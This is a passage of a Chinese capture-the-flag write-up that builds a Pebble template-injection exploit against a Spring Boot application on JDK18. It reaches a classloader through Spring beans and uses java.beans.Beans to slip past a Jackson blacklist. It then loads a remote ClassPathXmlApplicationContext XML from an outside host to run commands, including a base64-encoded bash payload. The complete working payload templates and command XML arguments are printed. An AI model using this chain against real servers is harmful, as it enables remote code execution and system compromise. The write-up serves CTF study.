    server-org.springframework.boot.autoconfigure.web.ServerProperties
    webServerFactoryCustomizerBeanPostProcessor
    errorPageRegistrarBeanPostProcessor
    org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletConfiguration
    dispatcherServlet
    spring.mvc-org.springframework.boot.autoconfigure.web.servlet.WebMvcProperties
    org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletRegistrationConfiguration
    dispatcherServletRegistration
    org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration
    org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration
    taskExecutorBuilder
    applicationTaskExecutor
    spring.task.execution-org.springframework.boot.autoconfigure.task.TaskExecutionProperties
    org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$WhitelabelErrorViewConfiguration
    error
    beanNameViewResolver
    org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$DefaultErrorViewResolverConfiguration
    conventionErrorViewResolver
    spring.web-org.springframework.boot.autoconfigure.web.WebProperties
    org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
    errorAttributes
    basicErrorController
    errorPageCustomizer
    preserveErrorControllerTargetClassPostProcessor
    org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$EnableWebMvcConfiguration
    requestMappingHandlerAdapter
    requestMappingHandlerMapping
    welcomePageHandlerMapping
    localeResolver
    themeResolver
    flashMapManager
    mvcConversionService
    mvcValidator
    mvcContentNegotiationManager
    mvcPatternParser
    mvcUrlPathHelper
    mvcPathMatcher
    viewControllerHandlerMapping
    beanNameHandlerMapping
    routerFunctionMapping
    resourceHandlerMapping
    mvcResourceUrlProvider
    defaultServletHandlerMapping
    handlerFunctionAdapter
    mvcUriComponentsContributor
    httpRequestHandlerAdapter
    simpleControllerHandlerAdapter
    handlerExceptionResolver
    mvcViewResolver
    mvcHandlerMappingIntrospector
    viewNameTranslator
    org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$WebMvcAutoConfigurationAdapter
    defaultViewResolver
    viewResolver
    requestContextFilter
    org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
    formContentFilter
    com.mitchellbosecke.pebble.boot.autoconfigure.PebbleServletWebConfiguration
    pebbleViewResolver
    com.mitchellbosecke.pebble.boot.autoconfigure.PebbleAutoConfiguration
    springExtension
    pebbleEngine
    pebble-com.mitchellbosecke.pebble.boot.autoconfigure.PebbleProperties
    org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration
    mbeanExporter
    objectNamingStrategy
    mbeanServer
    org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration
    springApplicationAdminRegistrar
    org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$ClassProxyingConfiguration
    forceAutoProxyCreatorToUseClassProxying
    org.springframework.boot.autoconfigure.aop.AopAutoConfiguration
    org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration
    applicationAvailability
    org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Jackson2ObjectMapperBuilderCustomizerConfiguration
    standardJacksonObjectMapperBuilderCustomizer
    spring.jackson-org.springframework.boot.autoconfigure.jackson.JacksonProperties
    org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperBuilderConfiguration
    jacksonObjectMapperBuilder
    org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$ParameterNamesModuleConfiguration
    parameterNamesModule
    org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperConfiguration
    jacksonObjectMapper
    org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration
    jsonComponentModule
    org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration
    org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration
    lifecycleProcessor
    spring.lifecycle-org.springframework.boot.autoconfigure.context.LifecycleProperties
    org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration$StringHttpMessageConverterConfiguration
    stringHttpMessageConverter
    org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration$MappingJackson2HttpMessageConverterConfiguration
    mappingJackson2HttpMessageConverter
    org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersConfiguration
    org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration
    messageConverters
    org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration
    spring.info-org.springframework.boot.autoconfigure.info.ProjectInfoProperties
    org.springframework.boot.autoconfigure.sql.init.SqlInitializationAutoConfiguration
    spring.sql.init-org.springframework.boot.autoconfigure.sql.init.SqlInitializationProperties
    org.springframework.boot.sql.init.dependency.DatabaseInitializationDependencyConfigurer$DependsOnDatabaseInitializationPostProcessor
    org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration
    scheduledBeanLazyInitializationExcludeFilter
    taskSchedulerBuilder
    spring.task.scheduling-org.springframework.boot.autoconfigure.task.TaskSchedulingProperties
    org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration
    restTemplateBuilderConfigurer
    restTemplateBuilder
    org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration$TomcatWebServerFactoryCustomizerConfiguration
    tomcatWebServerFactoryCustomizer
    org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration
    org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration
    characterEncodingFilter
    localeCharsetMappingsCustomizer
    org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration
    multipartConfigElement
    multipartResolver
    spring.servlet.multipart-org.springframework.boot.autoconfigure.web.servlet.MultipartProperties
    org.springframework.aop.config.internalAutoProxyCreator
之后也算运气好，测了前几个就发现通过取得internalCachingMetadataReaderFactory对象可以拿到classLoader
因此有了这个我们便可以加载任意类了
    {% set class1= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("xxxx") %}
但是我们需要获得一个类实例，但是我们不能去调用它的任何方法毕竟是class类，很好的一点是这里有jackson??，beans对象里也能直接获取到，解决一切问题
    {% set woshishuaibi =  beans.get("jacksonObjectMapper").readValue("{}", class1) %}
因此我们能获得一个类的实例以后rce就相对“简单”了??，比如说
    ScriptEngineManager engineManager = new ScriptEngineManager();
    ScriptEngine engine = engineManager.getEngineByName("js");
    engine.eval("xxxx");
但题目当中环境是jdk18，发现engineManager.getEngineByName里面裤子都不剩了啥都没有，看来这个方法也是没用的，同时由于jackson实例化限制我们也不能直接实例化jshell
此时灵机一动我又想到两个类，它们实例化加载配置文件可以造成rce
  * org.springframework.context.support.ClassPathXmlApplicationContext
  * org.springframework.context.support.FileSystemXmlApplicationContext
但是脸黑啊，环境里面jackson有限制，继承了AbstractPointcutAdvisor/AbstractApplicationContext这两个类的都不行，心里xxx
这时候怎么办呢？那classpath下有没有某个类可以帮助我们实例化任意对象呢？
### 另类绕过Jackson黑名单限制
当然有哒！也就是java.beans.Beans类，这个类可以帮助我们实例化任意方法
    public static Object instantiate(ClassLoader cls, String beanName) throws IOException, ClassNotFoundException {
      return Beans.instantiate(cls, beanName, null, null);
    }
这里的参数cls可以不传，为null则会默认调用ClassLoader.getSystemClassLoader();获取一个classloader
    public static Object instantiate(ClassLoader cls, String beanName,
                                     BeanContext beanContext,
                                     AppletInitializer initializer)
      throws IOException, ClassNotFoundException {
      InputStream ins;
      ObjectInputStream oins = null;
      Object result = null;
      boolean serialized = false;
      IOException serex = null;
      // If the given classloader is null, we check if an
      // system classloader is available and (if so)
      // use that instead.
      // Note that calls on the system class loader will
      // look in the bootstrap class loader first.
      if (cls == null) {
        try {
          cls = ClassLoader.getSystemClassLoader();
        } catch (SecurityException ex) {
          // We're not allowed to access the system class loader.
          // Drop through.
        }
      }
之后的逻辑我们不需要关注那个二次反序列化的部分,在后面可以看到可以实例化任意public修饰的构造方法
    if (result == null) {
      // No serialized object, try just instantiating the class
      Class cl;
      try {
        cl = ClassFinder.findClass(beanName, cls);
      } catch (ClassNotFoundException ex) {
        // There is no appropriate class.  If we earlier tried to
        // deserialize an object and got an IO exception, throw that,
        // otherwise rethrow the ClassNotFoundException.
        if (serex != null) {
          throw serex;
        }
        throw ex;
      }
      if (!Modifier.isPublic(cl.getModifiers())) {
        throw new ClassNotFoundException("" + cl + " : no public access");
      }
      /*
                 * Try to instantiate the class.
                 */
      try {
        result = cl.newInstance();
      } catch (Exception ex) {
        // We have to remap the exception to one in our signature.
        // But we pass extra information in the detail message.
        throw new ClassNotFoundException("" + cl + " : " + ex, ex);
      }
    }
### 最终构造实现RCE
最终模板文件构造
    {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
    {% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %}
    {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %}
    {{ yyy.setConfigLocation("http://xxxx/1.xml") }}
    {{ yyy.refresh() }}
1.xml
                    open
                    -a
                    calculator
本地弹出了计算器，那么现在则可以开始着手解题了，
构造命令`./getflag > /tmp/flag`
                    bash
                    -c
                    echo Li9nZXRmbGFnID4gL3RtcC9mbGFn|base64 -d|bash -i
先用burp狂轰乱炸，看到页面有回显的说明执行成功
再包含进来就ok了
## 参考文章
[远古pebble模板注入payload](https://gingsguard.github.io/server-side-template-injection-on-the-example-of-pebble/)  
[Determine if a Process Runs Inside a
Container](https://www.baeldung.com/linux/is-process-running-inside-container
"Determine if a Process Runs Inside a Container")
* * *